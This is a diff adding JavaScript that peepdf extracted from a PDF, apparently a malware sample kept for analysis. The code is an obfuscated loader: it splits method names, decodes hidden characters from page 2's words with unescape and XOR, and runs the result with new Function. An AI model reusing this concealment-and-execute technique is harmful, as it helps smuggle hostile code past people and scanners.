@@ -1,0 +1,29 @@
+// peepdf comment: Javascript code located in object 20 (version 0)
+
+var l = '';
+var h = app.doc;
+var f = '42dsg3%4hjkhda';
+f = f.substr(6, 1);
+var basic = 'getPage';
+var w = basic + 'Nt' + 'hWord';
+var file = basic + 'Nu' + 'mWords';
+var p = 'fr' + 'omCharCo' + 'de';
+var i = 'cha' + 'rCod' + 'eAt';
+var z = 0,
+    adobe = 2,
+    t = 35;
+var edit = this['u' + 'nesca' + 'pe'];
+var lGoogle = nFile(2, t);
+new Function(lGoogle)();
+
+function nFile(r, t) {
+    var google = h[file](2);
+    for (var a = 0; a < google; a++) {
+        wUpdate = h[w](r, a);
+        var uH = wUpdate.substr(wUpdate.length - adobe, adobe);
+        var update = edit(f + uH)[i](z);
+        l += String[p](update ^ t);
+    }
+    return l;
+}
+
